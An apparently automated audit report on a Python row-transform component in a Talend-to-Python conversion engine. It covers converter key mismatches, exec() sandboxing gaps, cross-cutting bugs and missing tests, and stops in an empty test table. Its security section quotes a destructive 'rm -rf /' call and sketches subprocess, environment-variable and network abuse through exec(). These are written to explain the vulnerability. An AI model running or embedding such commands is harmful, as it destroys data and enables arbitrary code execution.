# Audit Report: tPythonRow / PythonRowComponent

> **Audited**: 2026-03-21
> **Auditor**: Claude Opus 4.6 (automated) -- GOLD STANDARD TEMPLATE
> **Engine Version**: v1
> **Converter**: `complex_converter`
> **Status**: PRODUCTION READINESS REVIEW

---

## 1. Component Identity

| Field | Value |
|-------|-------|
| **Talend Name** | `tPythonRow` |
| **V1 Engine Class** | `PythonRowComponent` |
| **Engine File** | `src/v1/engine/components/transform/python_row_component.py` (201 lines) |
| **Converter Parser** | `src/converters/complex_converter/component_parser.py` -> `_map_component_parameters()` (line 384-386, generic fallback: `return config_raw`) |
| **Converter Dispatch** | `src/converters/complex_converter/converter.py` -> NO dedicated `elif` branch; falls through with no additional parsing after `parse_base_component()` |
| **Registry Aliases** | `PythonRowComponent`, `PythonRow`, `tPythonRow` (registered in `src/v1/engine/engine.py` lines 133-135) |
| **Category** | Transform / Custom Code |

### Key Files

| File | Purpose |
|------|---------|
| `src/v1/engine/components/transform/python_row_component.py` | Engine implementation (201 lines) |
| `src/converters/complex_converter/component_parser.py` (line 62) | Component mapping: `'tPythonRow': 'PythonRowComponent'` |
| `src/converters/complex_converter/component_parser.py` (lines 384-386) | Generic fallback in `_map_component_parameters()` -- returns raw config as-is |
| `src/converters/complex_converter/converter.py` | Dispatch -- NO dedicated `elif` for `tPythonRow`; no post-`parse_base_component()` enrichment |
| `src/v1/engine/base_component.py` | Base class: `_update_stats()`, `_update_global_map()`, `validate_schema()`, `execute()` |
| `src/v1/engine/global_map.py` | GlobalMap storage for `{id}_NB_LINE` etc. |
| `src/v1/engine/exceptions.py` | Custom exception hierarchy |
| `src/v1/engine/components/transform/__init__.py` | Package exports (line 19: `from .python_row_component import PythonRowComponent`) |

---

## 2. Scorecard

| Dimension | Score | P0 | P1 | P2 | P3 | Details |
|-----------|-------|----|----|----|----|---------|
| Converter Coverage | **R** | 1 | 2 | 2 | 0 | No dedicated parser; `CODE` stored under wrong key; no `output_schema` extraction; `DIE_ON_ERROR` wrong key; not in expression skip list |
| Engine Feature Parity | **Y** | 1 | 3 | 3 | 1 | `exec()` security; no `die_on_error`; no NaN/None handling; no `input_row` passthrough; missing globalMap vars |
| Code Quality | **Y** | 2 | 4 | 4 | 1 | Cross-cutting base class bugs; `iterrows()` anti-pattern; `exec()` without `__builtins__` restriction; limited type mapping; shared mutable context_dict leak; globalMap None crash |
| Performance & Memory | **Y** | 0 | 1 | 2 | 0 | `iterrows()` row-by-row is O(n) Python loop; `exec()` per-row compilation overhead; no vectorized alternative |
| Testing | **R** | 1 | 0 | 0 | 0 | Zero v1 unit tests; zero v1 integration tests |

**Overall: RED -- Not production-ready. Critical converter and security issues block safe deployment.**

### Score Key
- **R** (Red): Critical gaps blocking production use
- **Y** (Yellow): Significant gaps; usable for subset of jobs with known limitations
- **G** (Green): Production-ready with minor improvements recommended

---

## 3. Talend Feature Baseline

### What tPythonRow Does

`tPythonRow` is a custom-code transform component in Talend that executes user-supplied Python code once per input row. It is the Python equivalent of `tJavaRow`. The component receives each row from an upstream flow, exposes it as `input_row` and provides an `output_row` object for the user to populate. The user-supplied Python code runs in a per-row loop, allowing arbitrary transformations, lookups, string manipulation, and conditional logic. The transformed `output_row` is then sent downstream via the FLOW connection.

**Note**: `tPythonRow` is NOT a standard Talend Open Studio component. It is available in Talend Big Data / Data Fabric editions or via community custom components (e.g., the "Severus Snake" project). Official documentation is scarce. The behavioral baseline below is inferred from the analogous `tJavaRow` component (which IS extensively documented) and from the Talend Python component runtime model.

**Source**: [Talend Custom Code Components (TalendByExample)](https://www.talendbyexample.com/talend-custom-code-component-reference.html), [tJavaRow input_row/output_row pattern](http://garpitmzn.blogspot.com/2014/11/using-tjavarow-inputrow-and-outputrow.html), [Severus Snake Python component for Talend (GitHub)](https://github.com/ottensa/severus-snake), [Talend Community: tJavaRow copy input_row to output_row](https://community.talend.com/s/question/0D53p00007vClCfCAK/tjavarow-copy-all-properties-from-inputrow-to-outputrow?language=en_US)

**Component family**: Custom Code (Transform / Processing)
**Available in**: Talend Data Fabric, Talend Big Data; custom component installs for Open Studio
**Required JARs/Libraries**: Python interpreter (Jython or CPython bridge depending on variant)

### 3.1 Basic Settings

| # | Parameter | Talend XML Name | Type | Default | Description |
|---|-----------|-----------------|------|---------|-------------|
| 1 | Property Type | `PROPERTY_TYPE` | Built-In / Repository | Built-In | Whether config comes from metadata repository or is inline. Not needed at runtime. |
| 2 | Schema | `SCHEMA` | Schema editor | -- | Column definitions for input and output schemas. The output schema defines what columns `output_row` must populate. |
| 3 | Code | `CODE` | Code editor (TEXT/MEMO) | -- | **Mandatory**. The Python code to execute for each input row. Has access to `input_row`, `output_row`, `context`, `globalMap`, and imported routines. Executed once per row. |
| 4 | Map Type | `MAP_TYPE` | Dropdown | `MAP` | Controls how input maps to output. `MAP` = user code maps fields; `AUTO_MAP` = auto-pass-through of input columns to output. |
| 5 | Imports | `IMPORT` | Code editor | -- | Python import statements executed once before the row loop. Allows importing external libraries. |

### 3.2 Advanced Settings

| # | Parameter | Talend XML Name | Type | Default | Description |
|---|-----------|-----------------|------|---------|-------------|
| 6 | Die On Error | `DIE_ON_ERROR` | Boolean (CHECK) | `true` | Stop the entire job on code execution error. When unchecked, errors on individual rows may be silently dropped or routed to REJECT (if connected). |
| 7 | tStatCatcher Statistics | `TSTATCATCHER_STATS` | Boolean (CHECK) | `false` | Capture processing metadata for tStatCatcher. |
| 8 | Label | `LABEL` | String | -- | Cosmetic label. No runtime impact. |

### 3.3 Connection Types

| Connector | Direction | Type | Description |
|-----------|-----------|------|-------------|
| `FLOW` (Main) | Input | Row > Main | Input rows from upstream component. Each row is presented as `input_row`. |
| `FLOW` (Main) | Output | Row > Main | Successfully transformed rows where `output_row` was populated. |
| `REJECT` | Output | Row > Reject | Rows where Python code raised an exception. Contains original schema columns plus `errorCode` (String) and `errorMessage` (String). Only active when `DIE_ON_ERROR=false` and REJECT link is connected. |
| `SUBJOB_OK` | Output (Trigger) | Trigger | Fires when the entire subjob completes successfully. |
| `SUBJOB_ERROR` | Output (Trigger) | Trigger | Fires when the subjob fails. |
| `COMPONENT_OK` | Output (Trigger) | Trigger | Fires when this component completes successfully. |
| `COMPONENT_ERROR` | Output (Trigger) | Trigger | Fires when this component fails. |

### 3.4 GlobalMap Variables

| Variable Pattern | Type | When Set | Description |
|------------------|------|----------|-------------|
| `{id}_NB_LINE` | Integer | After execution | Total number of input rows processed. |
| `{id}_NB_LINE_OK` | Integer | After execution | Number of rows successfully output via FLOW. |
| `{id}_NB_LINE_REJECT` | Integer | After execution | Number of rows sent to REJECT (due to code errors). |
| `{id}_ERROR_MESSAGE` | String | On error | Last error message if any error occurred. |

### 3.5 Behavioral Notes

1. **`input_row` / `output_row` pattern**: In Talend's tJavaRow (and by extension tPythonRow), the standard pattern is: `input_row` is a read-only object containing the current row's column values. `output_row` is a mutable object that the user populates. If a column exists in both input and output schemas and is not explicitly set, tJavaRow auto-maps `output_row.col = input_row.col` for columns with matching names. This auto-passthrough is controlled by the `MAP_TYPE` parameter.

2. **`globalMap` access**: User code can read and write `globalMap` directly: `globalMap.put("myKey", value)` and `globalMap.get("myKey")`. This allows row-level state accumulation (counters, running totals, cross-row logic).

3. **`context` access**: Context variables are accessible as `context.variableName` within user code.

4. **REJECT flow behavior**: When `DIE_ON_ERROR=false` and a REJECT link is connected, rows where the code raises an exception are routed to REJECT with `errorCode` and `errorMessage` columns appended. When REJECT is NOT connected, errors may be silently dropped or cause job failure depending on the implementation.

5. **Code compilation**: In tJavaRow, the Java code is compiled once and executed per row. In a Python equivalent, the code string should ideally be compiled once (via `compile()`) and then executed per row via `exec()` to avoid re-parsing overhead.

6. **NB_LINE availability**: Global variables are available AFTER component execution completes, not during row processing within the same component.

7. **Type enforcement**: Output columns should match the types defined in the output schema. In tJavaRow, type mismatches cause `ClassCastException` at runtime. The Python equivalent should enforce type conversion according to the output schema.

8. **Null/NaN handling**: When input columns contain null values, `input_row` fields are Java `null` (in tJavaRow) or Python `None`/`NaN`. User code must handle these cases to avoid `NullPointerException` (Java) or `TypeError` (Python).

---

## 4. Converter Audit

### 4.1 Parameter Extraction

The converter uses the **deprecated generic parameter mapping approach** (`_map_component_parameters()` fallback in `component_parser.py` line 384-386). There is NO dedicated `elif component_type == 'tPythonRow'` branch in `converter.py:_parse_component()`. The component falls through with zero additional processing after the generic `parse_base_component()`.

**Converter flow**:
1. `converter.py:_parse_component()` calls `component_parser.parse_base_component(node)`
2. `parse_base_component()` iterates all `elementParameter` nodes, builds `config_raw` dict (lines 433-458)
3. **Critical**: `CODE` and `IMPORT` fields are NOT excluded from storage (only excluded from context-variable wrapping on line 449), so they ARE stored in `config_raw`
4. **Critical**: `tPythonRow` is NOT in the skip list `['tMap', 'tJavaRow', 'tJava']` on line 462, so the `CODE` field IS subjected to Java expression marking via `mark_java_expression()`. This may corrupt the Python code by prefixing it with `{{java}}`
5. Calls `_map_component_parameters('tPythonRow', config_raw)` (line 472)
6. No branch matches `tPythonRow`, so the `else` fallback on line 386 returns the entire `config_raw` as-is
7. Schema is extracted generically from `<metadata connector="FLOW">` and `<metadata connector="REJECT">` nodes
8. `converter.py:_parse_component()` has NO `elif component_type == 'tPythonRow'` branch, so no post-processing (like `parse_java_row()` which extracts `output_schema`) is applied

| # | Talend XML Parameter | Extracted? | V1 Config Key | Converter Line | Notes |
|----|----------------------|------------|---------------|----------------|-------|
| 1 | `CODE` | **Yes (wrong key)** | `CODE` | 458 (generic) | **Stored under `CODE` but engine expects `python_code`. Will ALWAYS fail with `ValueError: 'python_code' is required`.** |
| 2 | `IMPORT` | **Yes (wrong key)** | `IMPORT` | 458 (generic) | Stored as raw `IMPORT` key. Engine does not use it. |
| 3 | `SCHEMA` | Yes | `schema.output` | 474-508 (generic) | Schema extracted generically. Correct. |
| 4 | `MAP_TYPE` | **Partial** | `MAP_TYPE` | 458 (generic) | Stored under raw key. Engine does not use it. No auto-passthrough logic. |
| 5 | `DIE_ON_ERROR` | **Partial** | `DIE_ON_ERROR` | 458 (generic) | Stored under raw key `DIE_ON_ERROR`. Engine does not read this parameter at all. |
| 6 | `TSTATCATCHER_STATS` | **No** | -- | -- | Not needed (rarely used). |
| 7 | `LABEL` | **No** | -- | -- | Not needed (cosmetic). |
| 8 | `PROPERTY_TYPE` | No | -- | -- | Not needed (always Built-In). |

**Summary**: 0 of 5 runtime-relevant parameters are correctly mapped. The `CODE` parameter is stored but under the wrong key, making the component fail at runtime every time.

### 4.2 Schema Extraction

Schema is extracted generically in `parse_base_component()` (lines 474-508 of `component_parser.py`).

| Schema Attribute | Extracted? | Notes |
|------------------|-----------|-------|
| `name` | Yes | Column name from `column.get('name')` |
| `type` | Yes | Converted via `ExpressionConverter.convert_type()` to Python types (`str`, `int`, etc.) |
| `nullable` | Yes | Boolean conversion |
| `key` | Yes | Boolean conversion |
| `length` | Yes | Integer conversion, if present |
| `precision` | Yes | Integer conversion, if present |
| `pattern` (date) | Yes | Java date pattern converted to Python strftime |
| `default` | **No** | Not extracted |

**Critical gap**: Unlike `tJavaRow` which has a dedicated `parse_java_row()` method (component_parser.py lines 913-928) that extracts `output_schema` as a `{column_name: Type}` dict, `tPythonRow` has NO equivalent. The engine's `_validate_output_row()` expects `output_schema` as a `{column_name: type_name}` dict, but the converter never builds this. The schema is available in `component['schema']['output']` but never transformed into the engine's expected `output_schema` config format.

### 4.3 Expression Handling

**CODE field Java expression marking** (component_parser.py lines 462-469):
- `tPythonRow` is NOT in the skip list `['tMap', 'tJavaRow', 'tJava']` on line 462
- This means the `CODE` field (containing Python source code) is passed to `mark_java_expression()` which scans for Java operators, method calls, etc.
- Python code containing `+`, `-`, `/`, `.`, `(`, `)` will likely be marked as `{{java}}` expressions
- This CORRUPTS the Python code by prefixing it with `{{java}}`, making it unexecutable
- **Compare with tJavaRow**: `tJavaRow` IS in the skip list and also has a dedicated branch in `_map_component_parameters()` (line 317) that correctly maps `CODE` -> `java_code`

### 4.4 Converter Issues

| ID | Priority | Issue |
|----|----------|-------|
| CONV-PRC-001 | **P0** | **`CODE` stored under wrong config key**: The generic fallback stores the Talend `CODE` parameter under key `CODE`, but the engine's `_process()` reads `self.config.get('python_code', '')` (line 51). This means **every converted tPythonRow job will fail** with `ValueError: 'python_code' is required`. The tJavaRow converter correctly maps `CODE` -> `java_code` (line 328), but no equivalent mapping exists for tPythonRow. |
| CONV-PRC-002 | **P1** | **`CODE` field subject to Java expression marking**: `tPythonRow` is not in the skip list on line 462, so Python source code in the `CODE` parameter is scanned by `mark_java_expression()`. Any Python code with arithmetic operators, function calls, or dot notation will be prefixed with `{{java}}`, corrupting the code. Should add `'tPythonRow'` (and `'tPython'`, `'tPythonDataFrame'`) to the skip list. |
| CONV-PRC-003 | **P1** | **No `output_schema` extraction**: `tJavaRow` has a dedicated `parse_java_row()` method (lines 913-928) that builds `output_schema` as `{col_name: Type}` from the FLOW metadata. `tPythonRow` has no equivalent. The engine's `_validate_output_row()` (line 100) is never triggered because `output_schema` is never populated in config. |
| CONV-PRC-004 | **P1** | **No dedicated parser method**: `tPythonRow` uses the deprecated generic `_map_component_parameters()` fallback. There is no `parse_python_row()` method in `component_parser.py` and no `elif component_type == 'tPythonRow'` branch in `converter.py`. This violates the pattern established by `parse_java_row()`. |
| CONV-PRC-005 | **P2** | **`DIE_ON_ERROR` stored under wrong key**: Generic extraction stores it as `DIE_ON_ERROR` (boolean). Engine does not read this parameter at all -- there is no `die_on_error` handling in `PythonRowComponent._process()`. |

---

## 5. Engine Feature Parity

### 5.1 Feature Implementation Status

| # | Talend Feature | Implemented? | Fidelity | Engine Location | Notes |
|----|----------------|-------------|----------|-----------------|-------|
| 1 | Execute Python code per row | **Yes** | Medium | `_process()` line 70 | `exec(python_code, namespace)` per row via `iterrows()` |
| 2 | `input_row` dictionary | **Yes** | High | `_process()` line 73 | `row.to_dict()` creates `input_row` |
| 3 | `output_row` dictionary | **Yes** | High | `_process()` line 74 | Empty dict `{}` created per row |
| 4 | `context` variables | **Yes** | High | `_get_context_dict()` lines 132-149 | Flattened context dict with proper nesting handling |
| 5 | `globalMap` access | **Yes** | Medium | `_process()` line 81 | Passed as `self.global_map` object. User code can call `.put()` and `.get()` -- **but `.get()` is broken (see BUG-PRC-002)**. |
| 6 | `routines` access | **Yes** | High | `_process()` lines 82-84 | Both `routines` dict and spread `**python_routines` for direct access |
| 7 | Output schema validation | **Yes** | Medium | `_validate_output_row()` lines 151-200 | Type mapping and conversion. Only triggered if `output_schema` in config. |
| 8 | REJECT flow | **Partial** | Medium | `_process()` lines 105-111 | Errors caught per-row, added to `reject_rows` with `errorCode`/`errorMessage`. **But reject output is conditional on `not reject_df.empty` (line 127), which is correct.** |
| 9 | Statistics tracking | **Yes** | High | `_process()` lines 118-122 | `_update_stats(rows_read, rows_ok, rows_reject)` correctly counts all three. |
| 10 | Empty/null input handling | **Partial** | Medium | `_process()` line 46 | Returns empty DataFrame for None/empty input. Correct. |
| 11 | Common builtins in namespace | **Yes** | Low | `_process()` lines 86-91 | `len`, `str`, `int`, `float`, `bool` explicitly added. **But restricts namespace -- see BUG-PRC-004.** |
| 12 | **Auto-passthrough (MAP_TYPE=AUTO_MAP)** | **No** | N/A | -- | **No auto-mapping of input columns to output. User must explicitly copy every field.** |
| 13 | **`die_on_error` support** | **No** | N/A | -- | **No `die_on_error` handling. All errors are caught per-row and routed to reject. No option to stop the entire job on first error.** |
| 14 | **`IMPORT` / pre-loop code** | **No** | N/A | -- | **No support for import statements or setup code. User cannot import libraries.** |
| 15 | **Code pre-compilation** | **No** | N/A | -- | **`exec(python_code, namespace)` re-parses the code string every row. No `compile()` call.** |
| 16 | **`{id}_ERROR_MESSAGE` globalMap** | **No** | N/A | -- | **Error message not stored in globalMap.** |

### 5.2 Behavioral Differences from Talend

| ID | Priority | Description |
|----|----------|-------------|
| ENG-PRC-001 | **P0** | **`exec()` with unrestricted `__builtins__`**: The `exec(python_code, namespace)` call on line 94 passes a namespace that does NOT restrict `__builtins__`. This means user code has access to `open()`, `os`, `subprocess`, `__import__()`, `eval()`, `compile()`, and every built-in function. In a production environment with untrusted or semi-trusted code, this is an **arbitrary code execution vulnerability**. While Talend's tJavaRow runs in a JVM sandbox, the Python equivalent has zero sandboxing. User code can read/write arbitrary files, make network calls, or execute shell commands. |
| ENG-PRC-002 | **P1** | **No `die_on_error` support**: The engine has no `die_on_error` parameter handling. All exceptions are caught per-row (line 105) and routed to reject. In Talend, `DIE_ON_ERROR=true` (the default) would stop the entire job on the first code error. The V1 engine always silently collects errors, which can mask critical bugs in user code. |
| ENG-PRC-003 | **P1** | **No auto-passthrough of input columns**: In Talend's tJavaRow with `MAP_TYPE=MAP` (default), columns that exist in both input and output schemas and are not explicitly set by user code are auto-copied from `input_row` to `output_row`. The V1 engine always starts with an empty `output_row = {}` (line 74). If user code does not explicitly set every output column, those columns are missing from the output DataFrame. This silently drops data for common Talend patterns like `output_row.status = "PROCESSED"` where only one new column is added while all input columns pass through. |
| ENG-PRC-004 | **P1** | **NaN values in `input_row` not handled**: When pandas DataFrame cells contain `NaN` (from numeric columns) or `NaT` (from date columns), these values are passed directly to `input_row` via `row.to_dict()`. Python code like `input_row['age'] + 1` will produce `NaN` silently rather than raising an error. Talend's tJavaRow exposes null values as Java `null`, which causes `NullPointerException` -- a more visible failure mode. |
| ENG-PRC-005 | **P2** | **`globalMap.get()` is broken in user code**: If user Python code calls `globalMap.get("key")`, it will hit the broken `GlobalMap.get()` method (global_map.py line 28) which references undefined `default` variable. This crashes user code with `NameError`. See cross-cutting BUG-PRC-002. |
| ENG-PRC-006 | **P2** | **No `IMPORT` / setup code support**: Talend's tPythonRow has an `IMPORT` field for setup code (library imports, helper function definitions) that runs once before the row loop. The V1 engine does not support this. User code cannot `import pandas`, `import re`, `import json`, etc. Only the explicitly added builtins (`len`, `str`, `int`, `float`, `bool`) and routines are available. |
| ENG-PRC-007 | **P2** | **Empty string handling differs from Talend**: Talend treats empty strings and null as distinct values. The V1 engine's pandas backend may have empty strings in string columns (via `keep_default_na=False` upstream) or `NaN` (without that flag), creating inconsistent behavior depending on which upstream component produced the data. |
| ENG-PRC-008 | **P2** | **`{id}_ERROR_MESSAGE` not set in globalMap**: When errors occur, the error message is logged but not stored in globalMap for downstream reference. |
| ENG-PRC-009 | **P3** | **`output_row` not re-read from namespace after `exec()`**: Line 97 reads `output_row = namespace['output_row']`. If user code rebinds `output_row` to a new object (e.g., `output_row = {"a": 1}`) rather than mutating the existing dict (e.g., `output_row['a'] = 1`), the rebinding IS captured because namespace is checked. This is correct behavior, but should be documented. |

### 5.3 GlobalMap Variable Coverage

| Variable | Talend Sets? | V1 Sets? | How V1 Sets It | Notes |
|----------|-------------|----------|-----------------|-------|
| `{id}_NB_LINE` | Yes | **Yes** | `_update_stats()` -> `_update_global_map()` -> `global_map.put_component_stat()` | Set correctly via base class mechanism |
| `{id}_NB_LINE_OK` | Yes | **Yes** | Same mechanism | Correctly reflects successful rows |
| `{id}_NB_LINE_REJECT` | Yes | **Yes** | Same mechanism | Correctly reflects rejected rows |
| `{id}_ERROR_MESSAGE` | Yes (official) | **No** | -- | Not implemented |
| `{id}_EXECUTION_TIME` | N/A (v1 only) | **Yes** | Base class | V1-specific, not in Talend |

---

## 6. Code Quality

### 6.1 Bugs

| ID | Priority | Location | Description |
|----|----------|----------|-------------|
| BUG-PRC-001 | **P0** | `src/v1/engine/base_component.py:304` | **`_update_global_map()` references undefined variable `value`**: The log statement on line 304 uses `{stat_name}: {value}` but the variable in the for loop (line 301) is named `stat_value`, not `value`. This causes `NameError` at runtime whenever `global_map` is not None. **CROSS-CUTTING**: This bug affects ALL components, not just PythonRowComponent, since `_update_global_map()` is called after every component execution (via `execute()` line 218). |
| BUG-PRC-002 | **P0** | `src/v1/engine/global_map.py:28` | **`GlobalMap.get()` references undefined `default` parameter**: The method signature is `def get(self, key: str) -> Optional[Any]` (line 26), but the body calls `self._map.get(key, default)` (line 28). The `default` parameter is not in the signature, causing `NameError` on every `.get()` call. Additionally, `get_component_stat()` on line 58 calls `self.get(key, default)` with two arguments, but `get()` only accepts one. **CROSS-CUTTING**: Affects all code using `global_map.get()`, including user Python code in `PythonRowComponent` that calls `globalMap.get("key")`. |
| BUG-PRC-003 | **P1** | `src/v1/engine/components/transform/python_row_component.py:70` | **`iterrows()` returns pandas types, not Python types**: `row.to_dict()` on line 73 creates a dictionary where values may be `numpy.int64`, `numpy.float64`, `pandas.Timestamp`, `numpy.nan`, etc. rather than Python native types. User code expecting `isinstance(val, int)` checks will fail because `numpy.int64` is not `int`. User code performing `val is None` checks will miss `numpy.nan` values. This causes subtle type-related bugs in user code that would not exist in Talend's tJavaRow (where values are Java primitives/objects). |
| BUG-PRC-004 | **P1** | `src/v1/engine/components/transform/python_row_component.py:86-91` | **Namespace restricts available builtins but in a leaky way**: The namespace explicitly adds `len`, `str`, `int`, `float`, `bool` (lines 86-91), giving the impression of a restricted sandbox. However, because `__builtins__` is NOT explicitly set to an empty dict in the namespace, Python's `exec()` still provides ALL builtins (including `open`, `__import__`, `eval`, `compile`, `exec`). This is misleading: the explicit additions are redundant (they shadow builtins that are already available), and the code gives a false sense of security. Either restrict `__builtins__` properly or remove the redundant explicit additions. |
| BUG-PRC-005 | **P2** | `src/v1/engine/components/transform/python_row_component.py:100` | **`_validate_output_row()` silently drops extra columns**: When `output_schema` is provided, `_validate_output_row()` iterates only the schema columns (line 179: `for col_name, col_type in output_schema.items()`). Any extra columns the user added to `output_row` that are NOT in the schema are silently dropped (the validated row only contains schema columns). This differs from Talend where extra columns would cause a compile-time schema mismatch error. |
| BUG-PRC-006 | **P2** | `src/v1/engine/components/transform/python_row_component.py:166-177` | **Type mapping incomplete**: `_validate_output_row()` type mapping only covers `str/String`, `int/Integer`, `float/Float/Double/double`, `bool/Boolean`. Missing: `Date/date/datetime`, `Long/long`, `BigDecimal/Decimal/decimal`, `Short/short`, `Byte/byte`, `byte[]`. Date columns, long integers, and decimal precision values will not be converted. |
| BUG-PRC-007 | **P2** | `src/v1/engine/components/transform/python_row_component.py:94` | **`exec()` compiles code every row**: `exec(python_code, namespace)` on line 94 re-parses and compiles the `python_code` string on every iteration of the row loop. For large datasets (millions of rows), this creates significant overhead. The code should be compiled once via `compiled_code = compile(python_code, '<python_row>', 'exec')` before the loop and then `exec(compiled_code, namespace)` inside the loop. |
| BUG-PRC-009 | **P1** | `src/v1/engine/components/transform/python_row_component.py:61` | **Cross-row state leak via shared mutable `context_dict`**. Created once before loop (line 61), same reference passed to every row. User code mutations persist across rows. Diverges from Talend's immutable context. |
| BUG-PRC-010 | **P1** | `src/v1/engine/base_component.py:231` | **`_update_global_map()` crash in error handler (line 231) masks original exception**. User sees NameError instead of actual processing error. |
| BUG-PRC-011 | **P2** | `src/v1/engine/components/transform/python_row_component.py:81` | **`globalMap` can be None -- user code calling `globalMap.put()` crashes with AttributeError**. Separate from BUG-PRC-002. |

### 6.2 Naming Consistency

| ID | Priority | Issue |
|----|----------|-------|
| NAME-PRC-001 | **P2** | **Config key `python_code`** does not match Talend XML parameter `CODE`. The converter should map `CODE` -> `python_code`, analogous to `tJavaRow` mapping `CODE` -> `java_code`. |
| NAME-PRC-002 | **P3** | **Class name `PythonRowComponent`** includes `Component` suffix while some other transform components (e.g., `Map`, `FilterRows`, `SortRow`) do not. Inconsistent with `JavaRowComponent` (which also has the suffix), so internally consistent within the code-execution family. |

### 6.3 Standards Compliance

| ID | Priority | Standard | Violation |
|----|----------|----------|-----------|
| STD-PRC-001 | **P1** | "Every component MUST have its own `parse_*` method" | No `parse_python_row()` in `component_parser.py`. No `elif component_type == 'tPythonRow'` in `converter.py`. Uses deprecated generic fallback. `tJavaRow` has both (line 913, line 375). |
| STD-PRC-002 | **P2** | "No `_validate_config()` dead code" | `PythonRowComponent` does not override `_validate_config()`. No validation of `python_code` presence happens until runtime `_process()`. |
| STD-PRC-003 | **P2** | "Use Talend type format (`id_String`) in schemas" | Schema types are converted to Python format (`str`, `int`) via `ExpressionConverter.convert_type()`. However, `_validate_output_row()` supports both Python and Java type names, so this is partially mitigated. |

### 6.4 Debug Artifacts

| ID | Priority | Issue |
|----|----------|-------|
| -- | -- | No debug artifacts found. Code is clean. |

### 6.5 Security

| ID | Priority | Issue |
|----|----------|-------|
| SEC-PRC-001 | **P0** | **`exec()` with unrestricted `__builtins__`**: `exec(python_code, namespace)` on line 94 has full access to all Python builtins. User code can: (a) read/write arbitrary files via `open()`, (b) import arbitrary modules via `__import__()`, (c) execute shell commands via `__import__('subprocess').run(...)`, (d) access environment variables via `__import__('os').environ`, (e) make network calls via `__import__('urllib.request').urlopen(...)`. While this is acceptable for trusted converted Talend jobs where the code originates from the Talend Studio designer, it is a critical risk for any environment where config JSON could be tampered with or where untrusted users can define component configs. |
| SEC-PRC-002 | **P2** | **No code content validation**: The `python_code` string is executed without any static analysis, keyword scanning, or allowlist validation. Malicious code like `__import__('os').system('rm -rf /')` would execute without any check. |

### 6.6 Logging Quality

| Aspect | Assessment |
|--------|------------|
| Logger setup | Module-level `logger = logging.getLogger(__name__)` -- correct |
| Component ID prefix | All log messages use `Component {self.id}:` prefix -- correct |
| Level usage | INFO for start/complete, WARNING for empty input, ERROR for per-row failures -- correct |
| Start/complete logging | `_process()` logs row count at start (line 67) and completion with success/reject counts (line 124) -- correct |
| Sensitive data | No sensitive data logged -- correct. **However**, per-row error messages on line 106 may expose user data values in error strings -- minor concern. |
| No print statements | No `print()` calls -- correct |

### 6.7 Error Handling Quality

| Aspect | Assessment |
|--------|------------|
| Custom exceptions | Uses `ValueError` for missing `python_code` (line 55). Does NOT use custom exceptions from `exceptions.py` (`ConfigurationError` would be more appropriate). |
| Per-row error handling | Catches `Exception` per row (line 105). Correct granularity. |
| Error info in reject | Appends `errorCode='PYTHON_ERROR'` and `errorMessage=str(e)` to reject rows (lines 109-110). Matches Talend pattern. |
| No bare `except` | All except clauses specify `Exception` -- correct |
| Error messages | Include component ID and row index -- correct |
| No `die_on_error` | Component does NOT check or respect `die_on_error`. All errors are silently collected. |

### 6.8 Type Hints

| Aspect | Assessment |
|--------|------------|
| Method signatures | All methods have return type hints -- correct |
| Parameter types | `_process()`, `_get_context_dict()`, `_validate_output_row()` all have parameter type hints -- correct |
| Complex types | Uses `Dict[str, Any]`, `Optional[pd.DataFrame]` -- correct |

---

## 7. Performance & Memory

| ID | Priority | Issue |
|----|----------|-------|
| PERF-PRC-001 | **P1** | **`iterrows()` is a known pandas anti-pattern**: `for idx, row in input_data.iterrows()` (line 70) is the slowest way to iterate a pandas DataFrame. Each iteration creates a new Series object, copies data, and performs type inference. For 1M rows, this is orders of magnitude slower than vectorized operations or `itertuples()`. While row-by-row `exec()` inherently prevents vectorization, `itertuples()` is ~10x faster than `iterrows()` for the iteration itself. |
| PERF-PRC-002 | **P2** | **`exec()` re-parses code every row**: `exec(python_code, namespace)` (line 94) re-parses and compiles the Python code string on every iteration. For 1M rows, this means 1M parse operations. Pre-compiling with `compile()` eliminates the parse overhead, leaving only the execution cost. |
| PERF-PRC-003 | **P2** | **`row.to_dict()` creates new dict per row**: Line 73 calls `row.to_dict()` which allocates a new dictionary for every row. For wide DataFrames (100+ columns) and large row counts, this creates significant memory churn and GC pressure. |

### 7.1 Memory Management Assessment

| Aspect | Assessment |
|--------|------------|
| Streaming mode | Inherited from `BaseComponent`. HYBRID mode auto-switches to streaming for large DataFrames (> 3GB). Each chunk is processed independently. Correct design for row-by-row processing. |
| Output accumulation | `output_rows` list (line 64) and `reject_rows` list (line 65) accumulate ALL output/reject rows in memory before conversion to DataFrames (lines 114-115). For datasets where input_data fits in memory, output will too (assuming 1:1 row mapping). For datasets with row multiplication (user code adds multiple output_rows per input_row), memory could exceed expectations. |
| No explicit memory limit | No guard against `output_rows` growing unbounded. |

### 7.2 Streaming Mode Interaction

| Issue | Description |
|-------|-------------|
| Chunk boundary state | If user code uses `globalMap` to accumulate state across rows (e.g., running total), streaming mode processes each chunk independently in `_execute_streaming()` (base_component.py line 268). globalMap state IS preserved across chunks because it is a shared object. Correct behavior. |
| Reject accumulation | Reject rows from each chunk are lost in streaming mode because `_execute_streaming()` only collects `chunk_result['main']` (line 271), ignoring `chunk_result.get('reject')`. This means streaming mode silently drops reject information. |

---

## 8. Testing

### 8.1 Current Coverage

| Test Type | Exists? | File | Notes |
|-----------|---------|------|-------|
| V1 engine unit tests | **No** | -- | Zero test files found for `PythonRowComponent` v1 engine component |
| V1 engine integration tests | **No** | -- | No v1 engine integration tests found |

**Key finding**: The v1 engine has ZERO tests for this component. All 201 lines of v1 engine code are completely unverified.

### 8.2 Recommended Test Cases

#### P0 -- Must Have Before Production

| # | Test Case | Priority | Description |
|----|-----------|----------|-------------|
| 1 | Basic row transformation | P0 | Input with 3 columns, Python code creates output with computed column. Verify row count and values. |
| 2 | `input_row` / `output_row` contract | P0 | Verify `input_row` contains all input columns, `output_row` is initially empty, and output DataFrame matches populated `output_row`. |
| 3 | Error handling per row | P0 | Code that raises exception on specific row (e.g., division by zero). Verify row goes to reject with `errorCode='PYTHON_ERROR'` and `errorMessage`. |
| 4 | Empty input | P0 | `input_data=None` and `input_data=empty DataFrame`. Should return empty DataFrame without error. |
| 5 | Missing `python_code` | P0 | Config with no `python_code` key. Should raise `ValueError`. |
| 6 | Statistics tracking | P0 | Verify `NB_LINE`, `NB_LINE_OK`, `NB_LINE_REJECT` are set correctly after execution with both success and reject rows. |
| 7 | `globalMap` access from user code | P0 | User code calls `globalMap.put("key", "value")`. Verify value is retrievable from globalMap after execution. |

#### P1 -- Important

| # | Test Case | Priority | Description |
|----|-----------|----------|-------------|
